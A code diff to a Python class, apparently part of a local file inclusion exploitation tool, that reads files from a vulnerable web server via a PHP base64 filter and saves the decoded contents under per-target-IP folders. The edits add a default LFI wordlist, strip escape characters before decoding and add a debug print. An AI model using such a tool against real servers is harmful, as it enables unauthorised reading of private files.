@@ -24,7 +24,10 @@ class Read_File:
                print("[+] Login url        : ................ | : "+self.args.loginurl)
                print("[+] username         : ................ | : "+self.args.user)
                print("[+] Login password   : ................ | : "+self.args.password)
-            print("[+] self.LFI-wordlist   : ................ | : "+self.args.filelist)
+            if self.args.filelist:   
+               print("[+] self.LFI-wordlist   : ................ | : "+self.args.filelist)
+            else:
+                print("[+] self.LFI-wordlist   : ................ | : LFT_one.txt")
             print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
@@ -184,7 +187,7 @@ class Read_File:
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'a') as file2:
                                      base64 = file2.write(h) 
                                with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','__'),'r') as file2: 
-                                    read_data = file2.read() 
+                                    read_data = file2.read().replace('\\n','').replace('\\t','').replace('\\r','')
                                     import base64   
                                     decoded64 = str(base64.b64decode(read_data))   
                                     read_data = decoded64.split("\\n") 
@@ -204,13 +207,15 @@ class Read_File:
                             if '<' in line:
                                 line1=line.replace(line,'')                                                                     
                             else:
+                            
                                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'a') as File_1:  
                                      File_1.write(line) 
                                 with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','X'),'r') as File_1:  
-                                     read_data = File_1.read() 
+                                     read_data = File_1.read().replace('\\n','').replace('\\t','').replace('\\r','')
                                 import base64                                                           
                                 decoded64 = str(base64.b64decode(read_data))
                                 read_data = decoded64.split("\\n") 
+                                print(read_data)
                                 for line in read_data :                                          
                                     with open('./FileStore/'+self.ip_re.group()+"/"+self.args.read.replace('/','',1).replace('/','_'),'a') as File_2:
                                          data_Finsh = File_2.write(line.replace("b'",'').replace("'",'')+'\n')                        
